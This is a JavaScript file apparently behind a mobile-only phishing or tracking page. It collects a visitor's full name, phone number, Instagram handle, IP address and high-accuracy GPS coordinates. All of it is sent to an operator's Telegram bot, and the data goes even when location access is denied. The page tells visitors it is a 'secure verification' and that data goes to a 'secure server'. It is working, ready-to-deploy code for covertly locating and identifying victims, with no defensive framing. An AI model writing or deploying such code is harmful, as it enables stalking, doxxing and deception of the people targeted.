// ✅ CHECK FOR MOBILE/DESKTOP
const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
const isDesktop = !isMobile;

// 🛑 BLOCK DESKTOP IF ENABLED
if (CONFIG.BLOCK_PC && isDesktop) {
    document.getElementById('desktop-block').classList.remove('hidden');
} else {
    document.getElementById('mobile-content').classList.remove('hidden');
}

// 📍 LOCATION & DATA CAPTURE LOGIC
document.getElementById('geo-btn').addEventListener('click', function() {
    const btn = this;
    const statusMsg = document.getElementById('status-msg');
    
    // Check form inputs
    const fullName = document.getElementById('fullName').value;
    const phone = document.getElementById('phone').value;
    const insta = document.getElementById('insta').value;

    if(!fullName || !phone || !insta) {
        statusMsg.textContent = "Please fill all fields first.";
        statusMsg.style.color = "red";
        return;
    }

    btn.disabled = true;
    btn.innerHTML = "⏳ Capturing...";
    statusMsg.textContent = "Requesting location access...";

    // 1. GET IP ADDRESS (Using a public API)
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(ipData => {
            const ip = ipData.ip;

            // 2. GET GEOLOCATION (EXACT COORDINATES)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        // SUCCESS: Send data to Telegram
                        sendDataToTelegram({
                            ip: ip,
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            fullName: fullName,
                            phone: phone,
                            insta: insta,
                            userAgent: navigator.userAgent,
                            timestamp: new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})
                        });
                    },
                    (error) => {
                        handleLocationError(error, ip, fullName, phone, insta);
                    },
                    {
                        enableHighAccuracy: true, // Request high precision
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                statusMsg.textContent = "Geolocation not supported by browser.";
            }
        })
        .catch(err => {
            statusMsg.textContent = "IP fetch failed. Check connection.";
        });
});

function handleLocationError(error, ip, fullName, phone, insta) {
    const statusMsg = document.getElementById('status-msg');
    let errorMsg = "";

    switch(error.code) {
        case error.PERMISSION_DENIED:
            errorMsg = "Location permission denied. Please click 'Allow Exact Location' again.";
            break;
        case error.POSITION_UNAVAILABLE:
            errorMsg = "Location information unavailable.";
            break;
        case error.TIMEOUT:
            errorMsg = "Location request timed out.";
            break;
        default:
            errorMsg = "An unknown error occurred.";
            break;
    }
    
    statusMsg.textContent = errorMsg;
    statusMsg.style.color = "red";
    
    // Still send IP and basic info if location fails
    sendDataToTelegram({
        ip: ip,
        lat: "Denied",
        lng: "Denied",
        accuracy: "Denied",
        fullName: fullName,
        phone: phone,
        insta: insta,
        userAgent: navigator.userAgent,
        timestamp: new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'}),
        location_error: errorMsg
    });
}

// 📤 SEND TO TELEGRAM
async function sendDataToTelegram(data) {
    const statusMsg = document.getElementById('status-msg');
    statusMsg.textContent = "Uploading data to secure server...";

    // Construct Message Text
    let text = `🚨 <b>SECURE VERIFICATION COMPLETE</b>%0A`;
    text += `──────────────────────%0A`;
    text += `👤 <b>Name:</b> ${data.fullName}%0A`;
    text += `📞 <b>Phone:</b> ${data.phone}%0A`;
    text += `📸 <b>Instagram:</b> @${data.insta}%0A`;
    text += `──────────────────────%0A`;
    
    if (data.lat !== "Denied") {
        text += `📍 <b>GPS:</b> <code>${data.lat.toFixed(8)}, ${data.lng.toFixed(8)}</code>%0A`;
        text += `🗺️ <b>Map:</b> <a href="https://www.google.com/maps?q=${data.lat},${data.lng}">View Location</a>%0A`;
        text += `📏 <b>Accuracy:</b> ${Math.round(data.accuracy)}m%0A`;
    } else {
        text += `📍 <b>GPS:</b> Denied by User%0A`;
    }
    
    text += `──────────────────────%0A`;
    text += `🌐 <b>IP:</b> <code>${data.ip}</code>%0A`;
    text += `📱 <b>Device:</b> ${data.userAgent.substring(0, 30)}...%0A`;
    text += `🕐 <b>Time:</b> ${data.timestamp}`;

    const apiUrl = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.CHAT_ID}&text=${text}&parse_mode=HTML`;

    try {
        const response = await fetch(apiUrl);
        if (response.ok) {
            // SUCCESS UI
            document.getElementById('step-permission').classList.add('hidden');
            document.getElementById('step-success').classList.remove('hidden');
        } else {
            statusMsg.textContent = "Failed to send to Telegram.";
        }
    } catch (error) {
        statusMsg.textContent = "Network error. Try again.";
    }
                                                    }
